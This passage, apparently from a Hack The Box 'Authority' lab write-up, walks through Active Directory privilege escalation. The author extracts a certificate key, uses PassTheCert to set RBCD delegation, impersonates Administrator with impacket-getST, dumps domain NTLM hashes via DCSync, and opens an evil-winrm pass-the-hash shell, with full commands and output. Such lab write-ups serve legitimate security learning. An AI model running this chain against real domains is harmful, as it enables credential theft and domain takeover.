[*] Saved certificate and private key to 'administrator_authority.pfx'

```

The certificate and key received are saved in the ```administrator_authority.pfx``` file

```console
0ph3@parrot~$ ls
administrator_authority.pfx
```
 Next, we can use the ```certipy auth``` command to request the administrator's TGT and NTHASH.
 
```console
0ph3@parrot~$ certipy auth -pfx administrator_authority.pfx -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.htb'
> 0
[+] Trying to resolve 'authority.htb' at '8.8.8.8'
[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```
Looks like that failed. After researching the ```KDC_ERR_PADATA_TYPE_NOSUPP``` error, it appears that the domain controller is not configured to use Public Key Cryptography for Initial Authentication  (PKINIT). According to this [article](https://www.prosec-networks.com/en/blog/adcs-privescaas/), PKINIT is the authentication method which makes kerberos pre-authentication through certificates possible.

So we can't use the certificate to request the admin's TGT through kerberos but the article does mention an alternative method of certificate authentication and exploitation path. It's possible to use SChannel to authenticated against an LDAPS server using X.509 certificates. This means we could authenticate to the domain controller's LDAPS server using our certificate and interact with the directory as the domain administrator user defined in the SAN. Whith this access, we could grant a machine account we control [Resource Based Constrained Delegation (RBCD)](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd) over ther Domain Controller computer object in AD. The article links to the [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) tool which can be performed to take advantage of the LDAPS certificate authentication.

### PassTheCert RBCD

In short, since we have domain admin access to the ldaps server through our certificate, we can edit the DC object's ```msDS-AllowedToActOnBehalfOfOtherIdentity``` attribute and add our machine account's ( ```HACK01$```) SID to gain delegation over the DC. This will allow us to request a service ticket to the DC for any user we wish to impersonate and retrieve the user's TGT.

Let's start by cloning the PassTheTicket tool mentioned in the article.
```console
0ph3@parrot~$ git clone https://github.com/AlmondOffSec/PassTheCert.git
Cloning into 'PassTheCert'...                                                                                                                                                                 
remote: Enumerating objects: 133, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (11/11), done.       
remote: Total 133 (delta 0), reused 0 (delta 0), pack-reused 122
Receiving objects: 100% (133/133), 48.71 KiB | 702.00 KiB/s, done.                                                                                                                            
Resolving deltas: 100% (58/58), done.
```

Certificate authentication using the ```PassTheCert``` tool requires us to use the .crt certificate and private key.
```console
0ph3@parrot~$ python3 passthecert.py -h
<SNIP>
Authentication:
  -dc-host hostname     Hostname of the domain controller to use. If omitted, the domain part (FQDN) specified in the account parameter will be used
  -dc-ip ip             IP of the domain controller to use. Useful if you can't translate the FQDN.
  -crt user.crt         User's certificate
  -key user.key         User's private key
```
We can extract these from the ```administrator_authority.pfx``` cert.

Extracting the cert's key
```console
0ph3@parrot~$ openssl pkcs12 -in administrator_authority.pfx -nocerts -out admin.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

Extracting the crt from the .pfx
```console
0ph3@parrot~$ openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out admin.crt
Enter Import Password:
```

Let's use ```PassTheCert``` to set RBCD rights for our ```HACK01$``` machine over the domain controller ```AUTHORITY$```
```console
0ph3@parrot~$ python3 passthecert.py -dc-ip 10.10.11.222  -domain authority.htb -crt admin.crt -key admin.key -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'HACK01$'
Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra

Enter PEM pass phrase:
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] HACK01$ can now impersonate users on AUTHORITY$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     HACK01$      (S-1-5-21-622327497-3269355298-2248959698-11604)
```
With the attribute set, we can now use ```impacket-getST``` to impersonate the Administrator user and retrieve their TGT 

```console
0ph3@parrot~$ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/HACK01$:55a4a721e13c7bcfc8ac37bf6bd287f2'
Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
We get a ```Clock skew``` error because our attack machine and the DC do not have synchronized times within 5 minutes of each other.
Let's fix that using ```ntpdate```

```console
0ph3@parrot~$ sudo ntpdate 10.10.11.222
08 Jan 22:04:55 ntpdate[783273]: step time server 10.10.11.222 offset +43204.320471 sec
```
Let's try again now.
```console
0ph3@parrot~$ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/HACK01$:55a4a721e13c7bcfc8ac37bf6bd287f2'
Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

We can use the retrieved Administator TGT to request a DCsync and dump all the hashes on the DC
```console
0ph3@parrot~$ KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm
Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:9d641019d580fc2aaed5aed7fee0a3ac:::
HACK01$:11603:aad3b435b51404eeaad3b435b51404ee:1baffafa84162a4cc0319b55853b94e9:::
[*] Cleaning up... 
```
We can pass the administrator's hash using winrm to gain remote access to the DC as the administrator user, and finally, retrieve the root flag.
```console
┌─[✗]─[root@parrot]─[/htb/vpn]
└──╼ #evil-winrm -i 10.10.11.222 --user Administrator -H 6961f422924da90a6928197429eea4ed
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami; dir ..\desktop
htb\administrator


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/10/2024   5:46 PM             34 root.txt
``` 
